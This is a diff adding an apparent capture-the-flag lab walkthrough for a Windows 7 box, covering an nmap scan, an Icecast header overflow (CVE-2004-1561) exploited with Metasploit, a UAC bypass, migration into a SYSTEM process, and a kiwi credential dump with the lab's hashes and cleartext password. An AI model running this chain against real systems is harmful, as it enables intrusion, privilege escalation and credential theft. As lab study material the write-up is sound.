@@ -1,0 +1,82 @@
+--Nmap Scan--
+```
+DARK-PC (Windows Media Server)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  http         Icecast streaming media server
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+
+(Note: using "--script vuln" flag may show various vulnerabilities. However, on this box, Icecast vulnerability is the focus.)
+```
+
+--Vulnerability--
+```
+Execute Code Overflow
+CVE-2004-1561 	
+```
+
+--Metasploit--
+```
+module: exploit/windows/http/icecast_header
+(Note: Set LHOST and RHOSTS properly. At the time of this writing, the exploit escalates already with meterpreter.)
+>> execute 'run post/multi/recon/local_exploit_suggester' on the machine while on meterpreter. This will show that the host is vulenerable to 'exploit/windows/local/bypassuac_eventvwr'
+>> background the process to get out of meterpreter shell and use the exploit on this session
+(Note: set SESSION and LHOST properly)
+>> using 'getprivs' will show that the "SeTakeOwnershipPrivilege" permission is now granted
+>> list processes using 'ps' command
+>> migrate to a process being ran by NT AUTHORITY\SYSTEM (preferably spoolsv.exe or, winlogon.exe, etc.) to reside with it as new uid --> migrate -N spoolsv.exe
+>> 'load kiwi' to be able to run kiwi commands
+>> run 'creds_all'
+```
+
+--Sysinfo--
+```
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+```
+
+--Kiwi--
+```
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+```
